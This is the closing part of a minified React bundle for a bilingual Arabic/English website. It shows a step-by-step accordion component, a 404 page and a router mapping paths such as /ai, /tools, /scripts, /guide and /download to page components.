                                                            onClick: () => t(e === l ? null : l),
                                                            className:
                                                                "w-full p-5 flex items-center justify-between hover:bg-primary/5 transition-colors",
                                                            children: [
                                                                c.jsx("h3", {
                                                                    className: "text-xl font-bold text-primary",
                                                                    children: n === "ar" ? u.title.ar : u.title.en,
                                                                }),
                                                                e === l
                                                                    ? c.jsx(Ki, { className: "w-6 h-6 text-primary" })
                                                                    : c.jsx(Wi, {
                                                                          className: "w-6 h-6 text-muted-foreground",
                                                                      }),
                                                            ],
                                                        }),
                                                        e === l &&
                                                            c.jsx("div", {
                                                                className:
                                                                    "border-t border-border/30 p-6 animate-fade-in",
                                                                children: c.jsx("div", {
                                                                    className: "space-y-4",
                                                                    children: u.steps.map((d, p) =>
                                                                        c.jsxs(
                                                                            "div",
                                                                            {
                                                                                className: "flex gap-4",
                                                                                children: [
                                                                                    c.jsx("span", {
                                                                                        className:
                                                                                            "w-10 h-10 rounded-xl bg-primary/20 text-primary flex items-center justify-center font-bold flex-shrink-0",
                                                                                        children: p + 1,
                                                                                    }),
                                                                                    c.jsxs("div", {
                                                                                        children: [
                                                                                            c.jsx("h4", {
                                                                                                className:
                                                                                                    "font-bold text-foreground mb-1",
                                                                                                children:
                                                                                                    n === "ar"
                                                                                                        ? d.title.ar
                                                                                                        : d.title.en,
                                                                                            }),
                                                                                            c.jsx("p", {
                                                                                                className:
                                                                                                    "text-muted-foreground text-sm",
                                                                                                dir: "ltr",
                                                                                                children:
                                                                                                    n === "ar"
                                                                                                        ? d.description
                                                                                                              .ar
                                                                                                        : d.description
                                                                                                              .en,
                                                                                            }),
                                                                                        ],
                                                                                    }),
                                                                                ],
                                                                            },
                                                                            p
                                                                        )
                                                                    ),
                                                                }),
                                                            }),
                                                    ],
                                                },
                                                l
                                            )
                                        ),
                                    }),
                                ],
                            }),
                        ],
                    }),
                }),
                c.jsx(Sr, {}),
            ],
        });
    },
    ik = () => {
        const e = ko();
        return (
            x.useEffect(() => {
                console.error("404 Error: User attempted to access non-existent route:", e.pathname);
            }, [e.pathname]),
            c.jsx("div", {
                className: "flex min-h-screen items-center justify-center bg-muted",
                children: c.jsxs("div", {
                    className: "text-center",
                    children: [
                        c.jsx("h1", { className: "mb-4 text-4xl font-bold", children: "404" }),
                        c.jsx("p", {
                            className: "mb-4 text-xl text-muted-foreground",
                            children: "Oops! Page not found",
                        }),
                        c.jsx("a", {
                            href: "/",
                            className: "text-primary underline hover:text-primary/90",
                            children: "Return to Home",
                        }),
                    ],
                }),
            })
        );
    },
    ak = new FS(),
    lk = () =>
        c.jsx($S, {
            client: ak,
            children: c.jsx(Hb, {
                children: c.jsxs(hS, {
                    children: [
                        c.jsx(Zx, {}),
                        c.jsx(Rw, {}),
                        c.jsx(zb, {
                            children: c.jsxs(Ab, {
                                children: [
                                    c.jsx(Wt, { path: "/", element: c.jsx(Gb, {}) }),
                                    c.jsx(Wt, { path: "/ai", element: c.jsx(Xb, {}) }),
                                    c.jsx(Wt, { path: "/tools", element: c.jsx(Zb, {}) }),
                                    c.jsx(Wt, { path: "/cc", element: c.jsx(tk, {}) }),
                                    c.jsx(Wt, { path: "/scripts", element: c.jsx(nk, {}) }),
                                    c.jsx(Wt, { path: "/guide", element: c.jsx(rk, {}) }),
                                    c.jsx(Wt, { path: "/download", element: c.jsx(sk, {}) }),
                                    c.jsx(Wt, { path: "*", element: c.jsx(ik, {}) }),
                                ],
                            }),
                        }),
                    ],
                }),
            }),
        });
Nh(document.getElementById("root")).render(c.jsx(lk, {}));
